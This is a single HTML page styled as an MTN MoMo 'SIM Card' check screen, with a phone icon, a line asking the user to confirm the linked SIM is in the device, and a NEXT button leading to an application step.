<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM Card Check - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        html, body {
            margin: 0; padding: 0; width: 100%; min-height: 100vh;
            background-color: #003366; color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .screen-container {
            width: 100%; max-width: 550px; margin: 0 auto; min-height: 100vh;
            display: flex; flex-direction: column; justify-content: space-between; padding: 20px 24px 30px;
        }
        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
        .nav-btn { background: none; border: none; color: #FFCC00; font-size: 1.5rem; text-decoration: none; }
        .circle-bg {
            width: 220px; height: 220px; background-color: #ffffff;
            border-radius: 50%; display: inline-flex; align-items: center; justify-content: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.25); margin: 20px auto;
        }
        .title-text { color: #002244; font-weight: 800; font-size: 2rem; margin-bottom: 16px; }
        .info-card {
            background: #ffffff; color: #1a1a1a; border-radius: 24px; padding: 35px 25px;
            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); flex-grow: 1;
            display: flex; flex-direction: column; justify-content: space-between;
        }
        .btn-momo-next {
            background-color: #003366; color: #ffffff; font-weight: 800; font-size: 1.1rem;
            padding: 16px; border-radius: 30px; border: none; width: 100%;
            text-decoration: none; display: block; text-align: center;
        }
    </style>
</head>
<body>
    <div class="screen-container">
        <div class="top-nav">
            <a href="javascript:history.back()" class="nav-btn">❮</a>
            <a href="/" class="nav-btn">✕</a>
        </div>

        <div class="info-card my-3">
            <div>
                <div class="text-center">
                    <div class="circle-bg">
                        <svg width="100" height="100" viewBox="0 0 100 100" fill="none">
                            <rect x="35" y="20" width="42" height="68" rx="8" stroke="#003366" stroke-width="4.5" fill="none"/>
                            <circle cx="56" cy="80" r="2.5" fill="#003366"/>
                            <path d="M 22 35 L 35 35 L 35 55 L 22 55 L 18 51 L 18 39 Z" fill="#FFCC00" stroke="#003366" stroke-width="2"/>
                        </svg>
                    </div>
                </div>

                <h2 class="title-text">SIM Card</h2>
                <p class="text-secondary lead fs-6 px-2 mb-4">
                    Make sure that the SIM card linked to this profile is in this device.
                </p>
            </div>

            <div>
                <a href="/apply/step1" class="btn-momo-next">NEXT</a>
            </div>
        </div>
    </div>
</body>
</html>
